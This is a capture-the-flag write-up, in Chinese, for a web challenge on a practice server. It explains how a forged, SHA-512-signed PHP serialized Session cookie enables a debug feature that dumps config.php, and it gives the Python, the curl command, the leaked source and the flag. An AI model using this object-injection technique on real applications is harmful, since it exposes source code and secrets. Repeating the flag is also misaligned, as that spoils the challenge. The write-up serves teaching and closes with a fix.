# PHM #30 Web — login as admin 8.1

| 項目 | 值 |
|:---|:---|
| 類別 | Web |
| 分數 | 110 |

## 題目

> Hidden flag — same server as [#29 login8](login-as-admin-8.md), 不同 flag.

## 分析

#29 已經偽造 cookie 進了 admin, 現在要利用 Session 的 `debug()` 功能把 `config.php` 原始碼讀出來.

`session.php` 的 debug():

```php
public function debug() {
    if($this->debug) {
        if(file_in_web($this->debug_dump)) {   // file_in_web 只檢查 realpath 開頭是不是 ROOT
            highlight_file($this->debug_dump); // 直接噴 source
        } else {
            echo 'File out of scope';
        }
    } else {
        echo 'Debug mode is not enabled';
    }
    exit;
}
```

兩個 private 欄位要改:
- `debug = true` (啟用 debug)
- `debug_dump = "config.php"` (改讀 config)

然後打 `?debug=1`.

## 解法

```python
import hashlib, urllib.parse

cookie = ('O:7:"Session":6:{'
          's:14:"\x00Session\x00debug";b:1;'                      # 啟用 debug
          's:19:"\x00Session\x00debug_dump";s:10:"config.php";'   # 讀 config
          's:13:"\x00Session\x00data";a:0:{}'
          's:4:"user";s:0:"";s:4:"pass";s:0:"";s:8:"is_admin";b:1;'
          '}')
sig = hashlib.sha512(cookie.encode('latin-1')).hexdigest()
encoded = urllib.parse.quote(cookie, safe='')
```

```bash
curl 'https://ctf.hackme.quest/login8/?debug=1' \
  -H "Cookie: login8sha512=<sig>; login8cookie=<encoded>"
```

Dump 結果:

```php
<?php
define('ROOT', dirname(realpath(__FILE__)));
define('DEBUG_MODE', false);

$flag = "FLAG{object injection G____G}";
// hidden flag: "FLAG{wake up neo}";   ← 註解內的真 flag!

$users = [
    'guest' => ['password' => 'guest', 'admin' => false],
    'admin' => ['password' => false,   'admin' => true],
];
```

## Flag

```
FLAG{wake up neo}
```

## 感想

Session 的 `debug_dump` 功能本身就是後門: 連 LFI 都算不上, 直接是「給任意路徑就 highlight_file」. `file_in_web()` 只擋跳出 webroot, 擋不住讀 config.

這題跟 [#17 LFI](lfi.md) 本質相同 — **任何「給檔案路徑讀內容」的 debug/admin 功能都是風險**. 修法: debug 功能上 production 前要移掉, 不要 ship 到 release.

兩個 flag 都解完 = PHM 作者安排的「object injection」教學閉環. flag 名 `wake up neo` 可能致敬 Matrix 開場的那段話.
